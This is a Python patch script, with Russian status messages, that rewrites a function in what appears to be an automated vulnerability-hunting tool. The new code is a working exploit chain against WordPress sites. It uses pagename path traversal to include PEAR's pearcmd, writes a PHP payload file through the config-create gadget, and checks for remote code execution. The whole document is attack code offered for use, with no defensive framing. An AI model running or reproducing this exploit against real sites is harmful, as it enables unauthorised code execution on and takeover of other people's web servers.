import io, sys
P = r"C:\work\hunt2\core\vuln.py"
L = io.open(P, encoding="utf-8").read().split("\n")
i0 = next((i for i, l in enumerate(L) if l.startswith("def _wp_lfi(")), None)
i1 = next((i for i, l in enumerate(L) if l.startswith("def probe(")), None)
if i0 is None or i1 is None:
    print("границы не найдены"); sys.exit(1)

new = '''def _wp_lfi(base, ex, marker):
    """CVE-2026-87902: pagename traversal -> template include -> PEAR write gadget."""
    CT = "application/x-www-form-urlencoded"
    try:
        hr = _req("GET", base + "/")
        html = getattr(hr, "text", "") or ""
    except Exception:
        return False, "lfi:no-home", ""
    themes = sorted(set(re.findall(r"/wp-content/themes/([a-z0-9._-]+)/", html)))
    if not themes:
        return False, "lfi:no-theme", ""
    theme = themes[0]

    pid = _find_page(base)
    if not pid:
        return False, "lfi:no-page", ""

    def post(pname, query=""):
        body = ("page_id=%d&pagename=%s" % (pid, _denc(pname))).encode()
        return _req("POST", base + "/" + query, body=body, ctype=CT)

    ref = len(getattr(post("pbl-nope-" + _rnd(6)), "text", "") or "")

    good = []
    for td in ex.get("theme_dirs", ["page-templates"]):
        pre = td[5:] if td.startswith("page-") else td
        for tail in ("../header", "../index"):
            try:
                n = len(getattr(post(pre + "/" + tail), "text", "") or "")
            except Exception:
                continue
            if ref and n and abs(n - ref) > ref * 0.02:
                good.append(td)
                break
    if not good:
        return False, "lfi:no-dir " + theme, ""

    payload = "<?=" + _chrlit(marker) + "?>"
    out = ex.get("output", "/tmp/pbl") + _rnd(6)
    last = ""

    for td in good:
        pre = td[5:] if td.startswith("page-") else td
        for depth in (4, 3, 5, 6):
            for inc in ex.get("includes", ["/usr/local/lib/php/pearcmd"]):
                incp = pre + "/" + "../" * depth + inc.lstrip("/")
                outp = pre + "/" + "../" * depth + out.lstrip("/")
                try:
                    r1 = _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
                              body=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), ctype=CT)
                    t1 = getattr(r1, "text", "") or ""
                    pear = "PEAR_" in t1 or "Commands:" in t1 or "Warning:" in t1
                    r2 = post(outp)
                except Exception as e:
                    last = "lfi:" + type(e).__name__
                    continue
                last = "lfi:%s d%d %s" % (td, depth, inc)
                if marker in (getattr(r2, "text", "") or ""):
                    return True, "rce " + last, base + "/"
                if pear:
                    return True, "pear " + last, base + "/"
    return False, last, ""

'''.split("\n")

L[i0:i1] = new
io.open(P, "w", encoding="utf-8", newline="\n").write("\n".join(L))
print("_wp_lfi переписан")